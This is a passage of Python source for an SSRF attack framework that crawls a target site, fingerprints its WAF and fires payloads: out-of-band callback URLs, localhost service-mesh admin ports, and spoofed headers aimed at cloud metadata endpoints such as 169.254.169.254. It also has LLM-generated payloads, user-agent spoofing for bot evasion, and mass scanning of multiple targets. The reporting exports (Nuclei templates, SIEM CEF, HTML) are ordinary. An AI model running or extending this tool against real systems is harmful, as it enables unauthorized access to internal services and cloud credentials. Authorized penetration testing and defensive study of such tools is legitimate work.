                    try { const u = new URL(a.href, document.baseURI); if (u.origin === document.location.origin) paths.add(u.pathname+u.search); } catch(e) {}
                });
                document.querySelectorAll('form[action], script[src], iframe[src]').forEach(el => {
                    try { const u = new URL(el.action || el.src, document.baseURI); if (u.origin === document.location.origin) paths.add(u.pathname); } catch(e) {}
                });
                return Array.from(paths).slice(0,50);
            }""")
            crawled_paths.update(extracted)
        except Exception as e:
            if self.verbose: print(f"  {WARN} Crawl error: {e}")
        for p in crawled_paths:
            try:
                url = f"{self.base}{p}"
                s, b, h = await self.request("GET", url, timeout=8000)
                if s not in (0,404,403):
                    params = set(re.findall(r'[?&]([a-zA-Z_]\w*)=', p))
                    params.update(re.findall(r'name=["\']([^"\']+)["\']', b, re.I))
                    self.params.update(params)
                    ep = DiscoveredEndpoint(path=p, method="GET", params=params,
                                            accepts_url_param=True, test_response_code=s,
                                            content_type=h.get("content-type",""))
                    self.endpoints.append(ep)
            except: pass
        if self.verbose: print(f"  {OK} {len(self.endpoints)} endpoints")

    async def detect_cloud(self):
        if self.verbose: print(f"\n{CYAN}[CLOUD]{RESET} Cloud provider...")
        s, b, h = await self.request("GET", self.base)
        body_low = b.lower()
        indicators = {"AWS":["x-amz-request-id","ec2"],"GCP":["x-goog-","metadata.google.internal"],
                      "Azure":["x-ms-request-id"],"Alibaba":["aliyungf"]}
        self.cloud = [c for c, pats in indicators.items() if any(p in body_low or p in str(h).lower() for p in pats)]
        if self.verbose:
            if self.cloud: print(f"  {YELLOW}{', '.join(self.cloud)}{RESET}")
            else: print(f"  {OK} No specific cloud")

    def _callback_host(self): return self.cb.replace("https://","").replace("http://","").strip("/").lower()
    def make_callback_url(self, tag="ssrf", scheme="http"):
        host = self._callback_host()
        token = random.randint(100000, 999999)
        return f"{scheme}://{tag}-{token}.{host}"

    def _register_callback_context(self, payload, endpoint, param, phase, technique):
        try:
            parsed = urllib.parse.urlparse(payload)
            payload_host = (parsed.hostname or "").lower()
            if not payload_host: return
            self.callback_context[payload_host] = {
                "endpoint": endpoint, "param": param, "payload": payload,
                "phase": phase, "technique": technique, "created_at": datetime.now().isoformat()
            }
        except Exception: pass

    def _params_for_endpoint(self, ep, fallback=None):
        if self.user_param:
            return [self.user_param]

        params = list(ep.params) if ep.params else []

        if fallback:
            for item in fallback:
                if item not in params:
                    params.append(item)

        if not params:
            params = ["url"]

        return params

    def _find_callback_context(self, request_host):
        request_host = (request_host or "").lower()
        for payload_host, ctx in self.callback_context.items():
            if request_host == payload_host or request_host.endswith("." + payload_host):
                return ctx
        return {}

    async def basic(self):
        if self.verbose: print(f"\n{CYAN}[BASIC]{RESET} Common SSRF parameters...")
        for ep in self.endpoints[:5]:
            for param in self._params_for_endpoint(ep, fallback=["url", "uri", "file", "path", "redirect"]):
                payload = self.make_callback_url("basic")
                await self.test_payload(ep, param, payload, "Basic", f"param {param}")


    async def phase_graphql_ssrf(self):
        if self.no_graphql: return
        if self.verbose: print(f"\n{PURPLE}[GraphQL SSRF]{RESET} Testing...")

        introspection_query = """
        query {
          __schema {
            queryType { fields { name args { name type { kind name } } } }
            mutationType { fields { name args { name type { kind name } } } }
          }
        }"""
        for ep in self.endpoints:
            if "graphql" in ep.path.lower():

                s, b, _ = await self.request("POST", f"{self.base}{ep.path}", {"query": introspection_query})
                if "mutationType" in b:
                    payload = self.make_callback_url("graphql")

                    mutation = f"""mutation {{
                      someMutation(input: {{url: "{payload}"}} )
                    }}"""
                    await self.test_payload(ep, "query", mutation, "GraphQL", "Mutation URL arg")

    async def phase_api_schema_bypass(self):
        if self.no_api_schema: return
        if self.verbose: print(f"\n{PURPLE}[API Schema Bypass]{RESET} Probing...")

        for ep in self.endpoints:
            ct = "application/json"
            payload = self.make_callback_url("schema")

            data = {"url": [payload, "https://example.com"]}
            await self.test_payload(ep, "json", json.dumps(data), "API Schema", "JSON array bypass")

            data2 = {"legit": 1, "url": payload}
            await self.test_payload(ep, "json", json.dumps(data2), "API Schema", "Extra field")

    async def phase_service_mesh_ssrf(self):
        if self.no_mesh: return
        if self.verbose: print(f"\n{PURPLE}[Service Mesh SSRF]{RESET} Envoy/Istio admin...")
        targets = ["http://localhost:15000/", "http://127.0.0.1:15000/", "http://localhost:15020/"]
        for ep in self.endpoints[:5]:
            for param in self._params_for_endpoint(ep, fallback=["url"])[:4]:
                for t in targets:
                    await self.test_payload(ep, param, t, "Mesh", f"Admin port")

    async def phase_bot_evasion(self):
        if self.no_bot_evasion: return
        if self.verbose: print(f"\n{PURPLE}[Bot Evasion]{RESET} Spoofing user agent...")

        ua_list = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/123",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3) Safari/604.1",
            "Mozilla/5.0 (X11; Linux x86_64) Firefox/125.0"
        ]
        for ua in ua_list:
            ctx = await self.browser.new_context(user_agent=ua)
            page = await ctx.new_page()

            if self.endpoints:
                ep = self.endpoints[0]
                param = self._params_for_endpoint(ep)[0]
                payload = self.make_callback_url("bot")
                await self.test_payload(ep, param, payload, "Bot Evasion", f"UA:{ua[:20]}...")
            await ctx.close()

    async def phase_kubernetes_ingress_bypass(self):
        if self.no_k8s: return
        if self.verbose: print(f"\n{PURPLE}[K8s Ingress SSRF]{RESET} Probing ingress...")

        headers_list = [
            {"X-Forwarded-Host": "169.254.169.254"},
            {"X-Forwarded-For": "127.0.0.1"},
            {"Host": "metadata.google.internal"},
        ]
        for ep in self.endpoints[:5]:
            for param in self._params_for_endpoint(ep, fallback=["url"])[:4]:
                for h in headers_list:
                    payload = self.make_callback_url("ingress")
                    await self.test_payload(ep, param, payload, "K8s Ingress", f"Header {h}", extra_headers=h)


    async def run_ai_phases(self):
        if not self.ai or not self.ai.enabled: return
        if self.verbose: print(f"\n{PURPLE}[AI PHASES]{RESET} Analysis...")
        context = {
            "target": self.target,
            "waf": self.waf_info.get("primary",""),
            "cloud": ",".join(self.cloud),
            "callback_host": self._callback_host(),
            "endpoints": [e.path for e in self.endpoints[:5]],
            "params": [self.user_param] if self.user_param else sorted(list(self.params))[:20],
            "user_param": self.user_param,
        }
        payloads = await self.ai.generate_payloads(context)
        ai_payloads = getattr(self.ai, "last_llm_payloads", [])
        if payloads and self.endpoints:
            ep = self.endpoints[0]
            param = self._params_for_endpoint(ep)[0]
            for payload in payloads[:10]:
                await self.test_payload(ep, param, payload, "AI-Generated", "AI Payload")

        await self.run_ai_suggested_tests(context)

        if self.scan_attempts:
            summary_data = [{
                "target": a.target, "endpoint": a.endpoint, "param": a.param,
                "payload": a.payload, "tested_url": a.tested_url, "status": a.status,
                "result": a.result, "vulnerable": a.vulnerable, "severity": a.severity,
                "confidence": a.confidence, "matched_patterns": a.matched_patterns or [], "error": a.error
            } for a in self.scan_attempts[:30]]
            triage = await self.ai.triage(summary_data)
            if triage:
                safe = re.sub(r'[^a-zA-Z0-9.-]', '_', self.target)
                with open(self.output_dir / f"ai_triage_{safe}.md", "w", encoding="utf-8") as f:
                    f.write(triage)

    async def run_ai_suggested_tests(self, context):
        if not self.ai or not self.ai.enabled: return
        suggestions = await self.ai.suggest_additional_tests(context)
        self.ai_suggestions = suggestions
        if not suggestions: return
        endpoint_map = {e.path: e for e in self.endpoints}
        for suggestion in suggestions[:10]:
            ep = endpoint_map.get(suggestion.get("endpoint"))
            if not ep: continue
            value = suggestion.get("safe_test_value") or "test"
            if suggestion.get("issue_type") == "ssrf":
                await self.test_payload(ep, suggestion["param"], self.make_callback_url("ai"), "AI-SS", "AI SSRF")
            else:

                url = f"{self.base}{ep.path}?{suggestion['param']}={urllib.parse.quote(str(value))}"
                s, b, h = await self.request("GET", url)
                self.other_issue_attempts.append({
                    "issue_type": suggestion["issue_type"], "endpoint": ep.path,
                    "param": suggestion["param"], "payload": value, "status": s, "result": "manual_review"
                })


    def _dedup(self):
        grouped = {}
        sev_rank = {"critical": 4, "high": 3, "medium": 2, "low": 1, "info": 0}
        for ev in self.evidence:
            key = (ev.endpoint, ev.param)
            if key not in grouped:
                grouped[key] = {"max_sev": ev.severity, "count": 0, "oob": 0, "items": []}
            grouped[key]["count"] += 1
            grouped[key]["items"].append(ev)
            if ev.out_of_band_hit:
                grouped[key]["oob"] += 1
            if sev_rank.get(ev.severity, 0) > sev_rank.get(grouped[key]["max_sev"], 0):
                grouped[key]["max_sev"] = ev.severity
        return grouped

    def _safe_target_name(self):
        return re.sub(r'[^a-zA-Z0-9.-]', '_', self.target)

    def _write_ai_payload_log(self, payloads, ai_payloads):
        if not payloads:
            return
        payload_log = self.output_dir / f"ai_payloads_{self._safe_target_name()}.json"
        with open(payload_log, "w", encoding="utf-8") as f:
            json.dump({
                "target": self.target,
                "provider": self.llm.provider if self.llm else None,
                "model": self.llm.model if self.llm else None,
                "ai_usage": getattr(self.llm, "last_usage", {}) if self.llm else {},
                "ai_error": getattr(self.llm, "last_error", None) if self.llm else None,
                "ai_generated_payloads": ai_payloads,
                "all_payloads_used": payloads,
                "tested_payloads": payloads[:10]
            }, f, indent=2, ensure_ascii=False, default=str)
        if self.verbose:
            print(f"  {OK} AI payloads saved: {payload_log}")

    def export_nuclei(self):
        if not self.do_export_nuclei:
            return
        templates = []
        for ev in self.evidence:
            if not ev.out_of_band_hit:
                continue
            clean_endpoint = re.sub(r'[^a-zA-Z0-9_-]', '-', ev.endpoint.strip('/')) or 'root'
            clean_param = re.sub(r'[^a-zA-Z0-9_-]', '-', ev.param or 'param')
            template = {
                "id": f"ultimate-ssrf-{self._safe_target_name()}-{clean_endpoint}-{clean_param}".lower(),
                "info": {
                    "name": f"Potential SSRF on {ev.endpoint} via {ev.param}",
                    "author": "belladonnask",
                    "severity": ev.severity,
                    "description": "Generated from confirmed SSRF evidence collected by Ultimate SSRF Framework.",
                    "tags": "ssrf,oast,generated"
                },
                "requests": [{
                    "method": "GET",
                    "path": [f"{{{{BaseURL}}}}{ev.endpoint}?{ev.param}={{{{interactsh-url}}}}"],
                    "matchers": [{"type": "word", "part": "interactsh_protocol", "words": ["http", "dns"]}]
                }]
            }
            templates.append(template)
        if not templates:
            if self.verbose:
                print(f"  {DIM}No confirmed OOB SSRF evidence for Nuclei export{RESET}")
            return
        safe_target = self._safe_target_name()
        if YAML_AVAILABLE:
            report_file = self.output_dir / f"nuclei_{safe_target}.yaml"
            with open(report_file, "w", encoding="utf-8") as f:
                yaml.dump_all(templates, f, allow_unicode=True, sort_keys=False)
        else:
            report_file = self.output_dir / f"nuclei_{safe_target}.json"
            with open(report_file, "w", encoding="utf-8") as f:
                json.dump(templates, f, indent=2, ensure_ascii=False, default=str)
        if self.verbose:
            print(f"  {OK} Nuclei export: {report_file}")

    def export_siem_cef(self):
        if not self.do_export_siem:
            return
        entries = []
        def esc(v):
            return str(v).replace("\\", "\\\\").replace("=", "\\=").replace("|", "\\|").replace("\n", " ").replace("\r", " ")
        for attempt in self.scan_attempts:
            severity = attempt.severity or "info"
            signature = "SSRF confirmed" if attempt.vulnerable else "SSRF not confirmed"
            if attempt.result == "error":
                signature = "SSRF scan error"
            cef = f"CEF:0|SSRFFramework|UltimateSSRF|5.0|SSRF_ATTEMPT|{esc(signature)}|{esc(severity)}|"
            cef += (
                f"dhost={esc(self.target)} request={esc(attempt.tested_url)} "
                f"cs1Label=endpoint cs1={esc(attempt.endpoint)} "
                f"cs2Label=param cs2={esc(attempt.param)} "
                f"cs3Label=payload cs3={esc(attempt.payload)} "
                f"cs4Label=result cs4={esc(attempt.result)} "
                f"cs5Label=confidence cs5={esc(attempt.confidence)} "
                f"cn1Label=http_status cn1={attempt.status} "
                f"cs6Label=vulnerable cs6={esc(attempt.vulnerable)}"
            )
            if attempt.error:
                cef += f" msg={esc(attempt.error)}"
            entries.append(cef)
        for ev in self.evidence:
            cef = f"CEF:0|SSRFFramework|UltimateSSRF|5.0|SSRF_FINDING|SSRF evidence|{esc(ev.severity)}|"
            cef += (
                f"dhost={esc(self.target)} request={esc(ev.url)} "
                f"cs1Label=endpoint cs1={esc(ev.endpoint)} "
                f"cs2Label=param cs2={esc(ev.param)} "
                f"cs3Label=payload cs3={esc(ev.payload)} "
                f"cs4Label=patterns cs4={esc(', '.join(ev.matched_patterns))} "
                f"cs5Label=oob cs5={esc(ev.out_of_band_hit)} "
                f"cn1Label=impact_score cn1={int(ev.impact_score)}"
            )
            entries.append(cef)
        for item in self.other_issue_attempts:
            cef = f"CEF:0|SSRFFramework|UltimateSSRF|5.0|AI_SAFE_CHECK|{esc(item.get('issue_type'))}|{esc(item.get('result'))}|"
            cef += (
                f"dhost={esc(self.target)} request={esc(item.get('tested_url', ''))} "
                f"cs1Label=endpoint cs1={esc(item.get('endpoint'))} "
                f"cs2Label=param cs2={esc(item.get('param'))} "
                f"cs3Label=payload cs3={esc(item.get('payload'))} "
                f"cs4Label=result cs4={esc(item.get('result'))} "
                f"cs5Label=confidence cs5={esc(item.get('confidence', 'low'))}"
            )
            entries.append(cef)
        cef_file = self.output_dir / f"siem_{self._safe_target_name()}.cef"
        with open(cef_file, "w", encoding="utf-8") as f:
            f.write("\n".join(entries))
        if self.verbose:
            print(f"  {OK} CEF exported: {cef_file}")

    def export_json_api(self):
        if not self.do_export_json_api:
            return
        attempts = [asdict(attempt) for attempt in self.scan_attempts]
        vulnerable_attempts = [a for a in attempts if a.get("vulnerable")]
        error_attempts = [a for a in attempts if a.get("result") == "error"]
        not_confirmed_attempts = [a for a in attempts if a.get("result") == "not_confirmed"]
        data = {
            "target": self.target,
            "timestamp": datetime.now().isoformat(),
            "framework_version": "5.0-waf-aware",
            "cloud": self.cloud,
            "waf": self.waf_info,
            "is_vulnerable_to_ssrf": bool(vulnerable_attempts) or bool(self.evidence),
            "status": "vulnerable" if vulnerable_attempts or self.evidence else "not_confirmed",
            "total_findings": len(self.evidence),
            "unique_findings": len(self._dedup()),
            "callbacks": len(self.callbacks),
            "attempt_summary": {
                "total": len(attempts),
                "vulnerable": len(vulnerable_attempts),
                "not_confirmed": len(not_confirmed_attempts),
                "errors": len(error_attempts),
                "ai_suggested_checks": len(self.other_issue_attempts)
            },
            "vulnerable_payloads": vulnerable_attempts,
            "not_confirmed_payloads": not_confirmed_attempts,
            "errors": error_attempts,
            "evidence": [asdict(ev) for ev in self.evidence],
            "callbacks_detail": dict(self.callbacks),
            "internal_ips": list(self.internal_ips),
            "ai_suggestions": self.ai_suggestions,
            "other_issue_attempts": self.other_issue_attempts
        }
        report_file = self.output_dir / f"api_report_{self._safe_target_name()}.json"
        with open(report_file, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2, ensure_ascii=False, default=str)
        if self.verbose:
            print(f"  {OK} JSON API exported: {report_file}")

    def generate_attack_map(self):
        if not self.do_attack_map:
            return
        if not NETWORKX_AVAILABLE:
            if self.verbose:
                print(f"{WARN} networkx missing")
            return
        G = nx.Graph()
        G.add_node(self.target, type="target", status="vulnerable" if self.evidence else "not_confirmed")
        for ip in sorted(self.internal_ips):
            G.add_node(ip, type="internal")
            G.add_edge(self.target, ip, relation="internal-reference")
        for index, attempt in enumerate(self.scan_attempts[:250], 1):
            attempt_id = f"attempt-{index}"
            G.add_node(attempt_id, type="attempt", endpoint=attempt.endpoint, param=attempt.param, payload=attempt.payload, result=attempt.result, vulnerable=str(attempt.vulnerable), status=str(attempt.status))
            G.add_edge(self.target, attempt_id, relation="tested")
            if attempt.vulnerable:
                payload_id = f"payload-{index}"
                G.add_node(payload_id, type="payload", value=attempt.payload, severity=attempt.severity)
                G.add_edge(attempt_id, payload_id, relation="confirmed-payload")
        for index, item in enumerate(self.other_issue_attempts[:100], 1):
            issue_id = f"ai-issue-{index}"
            G.add_node(issue_id, type="ai_suggested_check", issue_type=str(item.get("issue_type")), endpoint=str(item.get("endpoint")), param=str(item.get("param")), result=str(item.get("result")), confidence=str(item.get("confidence", "low")))
            G.add_edge(self.target, issue_id, relation="ai-suggested-check")
        graph_file = self.output_dir / f"attack_map_{self._safe_target_name()}.gexf"
        nx.write_gexf(G, graph_file)
        if self.verbose:
            print(f"  {OK} Attack map exported: {graph_file}")

    async def generate_html(self):
        if not JINJA2_AVAILABLE:
            return
        deduped = self._dedup()
        vulns = [{"endpoint": ep or "unknown", "param": param or "callback", "severity": info["max_sev"], "oob": info["oob"]} for (ep, param), info in deduped.items()]
        attempts = [asdict(attempt) for attempt in self.scan_attempts[:350]]
        vulnerable = any(attempt.get("vulnerable") for attempt in attempts) or bool(self.evidence)
        errors = [attempt for attempt in attempts if attempt.get("result") == "error"]
        not_confirmed = [attempt for attempt in attempts if attempt.get("result") == "not_confirmed"]
        html = Template("""
<!DOCTYPE html>
<html>
<head>
<title>SSRF Report - {{target}}</title>
<style>
body{font-family:Arial;background:#1a1a2e;color:#eee;padding:20px}.header{background:linear-gradient(135deg,#667eea,#764ba2);padding:30px;border-radius:10px;margin-bottom:20px}.card{background:#16213e;padding:20px;border-radius:10px;margin:10px 0}.critical{color:#ff4444}.high{color:#ff8c00}.medium{color:#ffd700}.info{color:#8ab4f8}table{width:100%;border-collapse:collapse;font-size:13px}th{background:#0f3460;padding:10px;text-align:left}td{padding:8px;border-bottom:1px solid #333;vertical-align:top;word-break:break-word}.badge{padding:4px 8px;border-radius:4px;font-size:12px;display:inline-block}.badge-critical{background:#ff4444;color:#fff}.badge-high{background:#ff8c00;color:#fff}.badge-medium{background:#ffd700;color:#000}.badge-info{background:#444;color:#fff}.badge-vulnerable{background:#ff4444;color:#fff}.badge-not_confirmed{background:#555;color:#fff}.badge-error{background:#8b0000;color:#fff}.badge-suspected_other_issue{background:#d97706;color:#fff}.badge-manual_review{background:#2563eb;color:#fff}code{color:#9cdcfe}
</style>
</head>
<body>
<div class="header"><h1>Ultimate SSRF Framework v5.0 Report</h1><p>Target: <strong>{{target}}</strong></p><p>Date: {{date}}</p><p>Status: {% if vulnerable %}<span class="badge badge-vulnerable">VULNERABLE / CONFIRMED SIGNAL</span>{% else %}<span class="badge badge-not_confirmed">NOT CONFIRMED</span>{% endif %}</p></div>
<div class="card"><h2>Summary</h2><p>WAF: {{waf}}</p><p>Cloud: {{cloud}}</p><p>Endpoints: {{endpoints}}</p><p>Findings: {{findings}} raw / {{unique}} unique</p><p>Callbacks: {{callbacks}}</p><p>Total Attempts: {{attempts|length}}</p><p>Not Confirmed: {{not_confirmed|length}}</p><p>Errors: {{errors|length}}</p></div>
<div class="card"><h2>Confirmed Findings</h2><table><tr><th>Endpoint</th><th>Parameter</th><th>Severity</th><th>Callbacks</th></tr>{% for v in vulns %}<tr><td>{{v.endpoint}}</td><td>{{v.param}}</td><td><span class="badge badge-{{v.severity}}">{{v.severity.upper()}}</span></td><td>{{v.oob}}</td></tr>{% endfor %}</table></div>
<div class="card"><h2>Payload Attempts</h2><table><tr><th>Result</th><th>Status</th><th>Endpoint</th><th>Param</th><th>Payload</th><th>Evidence / Error</th></tr>{% for a in attempts %}<tr><td><span class="badge badge-{{a.result}}">{{a.result}}</span></td><td>{{a.status}}</td><td>{{a.endpoint}}</td><td>{{a.param}}</td><td><code>{{a.payload}}</code></td><td>{% if a.matched_patterns %}{{a.matched_patterns | join(", ") }}{% elif a.error %}{{a.error}}{% else %}No SSRF evidence confirmed for this payload.{% endif %}</td></tr>{% endfor %}</table></div>
<div class="card"><h2>AI Suggested Safe Checks</h2><table><tr><th>Issue Type</th><th>Result</th><th>Status</th><th>Endpoint</th><th>Param</th><th>Evidence / Reason</th></tr>{% for item in other_issue_attempts %}<tr><td>{{item.issue_type}}</td><td><span class="badge badge-{{item.result}}">{{item.result}}</span></td><td>{{item.status}}</td><td>{{item.endpoint}}</td><td>{{item.param}}</td><td>{% if item.evidence %}{{item.evidence | join(", ") }}{% else %}{{item.reason}}{% endif %}</td></tr>{% endfor %}</table></div>
</body>
</html>
        """).render(target=self.target, date=datetime.now().strftime("%Y-%m-%d %H:%M"), waf=self.waf_info.get("primary", "N/A") if self.waf_info else "N/A", cloud=", ".join(self.cloud) if self.cloud else "Unknown", endpoints=len(self.endpoints), findings=len(self.evidence), unique=len(deduped), callbacks=len(self.callbacks), vulns=vulns, attempts=attempts, vulnerable=vulnerable, errors=errors, not_confirmed=not_confirmed, other_issue_attempts=self.other_issue_attempts)
        with open(self.html_file, "w", encoding="utf-8") as f:
            f.write(html)
        if self.verbose:
            print(f"  {OK} HTML report: {self.html_file}")

    async def save_json(self):
        vulnerable = any(attempt.vulnerable for attempt in self.scan_attempts) or bool(self.evidence)
        data = {
            "target": self.target,
            "time": datetime.now().isoformat(),
            "framework_version": "5.0-waf-aware",
            "cloud": self.cloud,
            "waf": self.waf_info,
            "is_vulnerable_to_ssrf": vulnerable,
            "status": "vulnerable" if vulnerable else "not_confirmed",
            "endpoints": [{"path": e.path, "method": e.method, "params": list(e.params), "status": e.test_response_code, "content_type": e.content_type} for e in self.endpoints],
            "attempts": [asdict(attempt) for attempt in self.scan_attempts],
            "evidence": [asdict(ev) for ev in self.evidence],
            "callbacks": dict(self.callbacks),
            "internal_ips": list(self.internal_ips),
            "ai_suggestions": self.ai_suggestions,
            "other_issue_attempts": self.other_issue_attempts
        }
        with open(self.json_file, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2, ensure_ascii=False, default=str)

    def print_summary(self):
        deduped = self._dedup()
        vulnerable = any(a.vulnerable for a in self.scan_attempts) or bool(self.evidence)
        errors = sum(1 for attempt in self.scan_attempts if attempt.result == "error")
        not_confirmed = sum(1 for attempt in self.scan_attempts if attempt.result == "not_confirmed")
        print(f"\n{BOLD}{GREEN}{'='*50}{RESET}")
        print(f"{BOLD}{GREEN}  SCAN COMPLETE - {self.target}{RESET}")
        print(f"{BOLD}{GREEN}{'='*50}{RESET}")
        print(f"  Status: {'vulnerable' if vulnerable else 'not_confirmed'}")
        print(f"  WAF: {self.waf_info.get('primary','N/A') if self.waf_info else 'N/A'}")
        print(f"  Cloud: {', '.join(self.cloud) or 'Unknown'}")
        print(f"  Endpoints: {len(self.endpoints)}")
        print(f"  Attempts: {len(self.scan_attempts)} total / {not_confirmed} not confirmed / {errors} errors")
        print(f"  Evidence: {len(self.evidence)} raw / {len(deduped)} unique")
        print(f"  Callbacks: {len(self.callbacks)}")
        for (ep, param), info in list(deduped.items())[:10]:
            sev = info["max_sev"]
            col = {"critical": RED, "high": YELLOW, "medium": MAGENTA}.get(sev, BLUE)
            print(f"  {col}[{sev.upper()}]{RESET} {ep} → {param} ({info['oob']} callbacks)")
        print(f"\n  {DIM}Report: {self.html_file}{RESET}")
        print(f"  {DIM}Results: {self.json_file}{RESET}")

    async def run(self):
        print(f"\n{BOLD}{'='*50}{RESET}\n{BOLD}Target:{RESET} {self.target}\n{BOLD}Callback:{RESET} {self.cb}")
        if self.dangerous_payloads: print(f"{BOLD}{RED}DANGEROUS payloads enabled!{RESET}")
        await self.start()
        try:
            await self.discover()
            if not self.no_waf:
                s, b, h = await self.request("GET", self.base)
                self.waf_info = self.waf.fingerprint(h, b)
                if self.verbose:
                    if self.waf_info.get("detected"):
                        print(f"\n{CYAN}[WAF]{RESET} {YELLOW}{self.waf_info['primary']}{RESET} ({self.waf_info['confidence']:.0f}%)")
                        bypass = self.waf_info.get("bypass_suggestions", [])
                        if bypass: print(f"  {DIM}Bypass suggestions: {', '.join(bypass[:5])}{RESET}")
                    else: print(f"\n{CYAN}[WAF]{RESET} None detected")
            await self.detect_cloud()
            await self.basic()
            await self.phase_graphql_ssrf()
            await self.phase_api_schema_bypass()
            await self.phase_service_mesh_ssrf()
            await self.phase_bot_evasion()
            await self.phase_kubernetes_ingress_bypass()
            await self.run_ai_phases()
            if not self.evidence and self.verbose:
                print(f"\n{OK} No confirmed SSRF findings detected. Generating not_confirmed report.")
            self.export_nuclei()
            self.export_siem_cef()
            self.export_json_api()
            self.generate_attack_map()
            await self.generate_html()
            await self.save_json()
            self.print_summary()
        finally:
            await self.stop()

async def main():
    parser = setup_argparse()
    args = parser.parse_args()
    if args.param and not args.target:
        parser.error("--param can only be used with --target. For mass scanning, omit --param and let the framework discover parameters automatically.")
    print(BANNER)

    targets = TargetManager.from_args(args)
    if not targets:

        t = input("Target domain: ").strip()
        targets = [TargetManager._clean(t)] if t else []
    for i, t in enumerate(targets, 1):
        print(f"\n{BOLD}{YELLOW}[{i}/{len(targets)}]{RESET} Scanning: {t}")
        await UltimateSSRFFramework(t, args).run()
        if i < len(targets): await asyncio.sleep(5)

if __name__ == "__main__":
    asyncio.run(main())
